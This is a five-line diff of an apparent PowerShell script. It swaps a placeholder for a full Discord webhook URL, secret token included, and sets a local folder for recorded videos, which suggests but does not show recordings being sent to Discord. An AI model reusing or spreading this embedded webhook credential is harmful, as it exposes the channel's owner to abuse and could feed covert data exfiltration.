@@ -1,5 +1,5 @@
 # Define the Discord webhook URL
-$webhookUrl = "YOUR_WEBHOOK_URL"
+$webhookUrl = "https://discord.com/api/webhooks/1497824412307820575/JmEyUzNIHjGl81yZqJ5_svUO1GeMmDPH55jrxqKpVYOsR591zIlXhpJtPugGVcku5tMR"
 
 # Set the file path for storing recorded videos
 $recordFilePath = "C:\RecordedVideos"
